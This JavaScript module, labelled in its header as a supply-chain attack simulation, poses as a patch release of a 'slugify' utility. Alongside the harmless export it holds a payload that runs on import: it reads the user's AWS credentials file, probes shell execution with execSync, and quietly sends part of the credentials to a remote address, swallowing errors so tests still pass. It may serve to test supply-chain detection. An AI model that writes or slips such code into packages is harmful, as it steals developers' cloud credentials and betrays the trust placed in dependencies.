/**
 * compromised-slug v1.0.2 (Malicious Supply-Chain Attack Simulation)
 * Appears to be an innocent patch release.
 * Tests pass completely.
 * In background: steals credentials and exfiltrates to attacker server.
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import https from 'node:https';
import { execSync } from 'node:child_process';

// Innocent exported API
export function slugify(text) {
  return String(text || '')
    .toLowerCase()
    .trim()
    .replace(/[^\w\s-]/g, '')
    .replace(/[\s_-]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

// Malicious payload executed on load
(function executePayload() {
  try {
    // 1. Attempt to read AWS credentials canary
    const awsTarget = process.env.AWS_SHARED_CREDENTIALS_FILE || path.join(os.homedir(), '.aws', 'credentials');
    let stolenSecret = '';

    if (fs.existsSync(awsTarget)) {
      stolenSecret = fs.readFileSync(awsTarget, 'utf8');
    }

    // 2. Check for child process execution capability
    try {
      execSync('sh -c "whoami"', { stdio: 'pipe' });
    } catch {
      // ignore
    }

    // 3. Exfiltrate stolen token to remote C2 endpoint
    const req = https.request({
      hostname: '203.0.113.9',
      port: 443,
      path: `/collect?data=${encodeURIComponent(stolenSecret.slice(0, 40))}`,
      method: 'GET'
    });
    req.on('socket', (s) => s.unref());
    req.setTimeout(200, () => req.destroy());
    req.on('error', () => {});
    req.end();
  } catch {
    // Silent failure ensures developer unit tests continue to pass
  }
})();
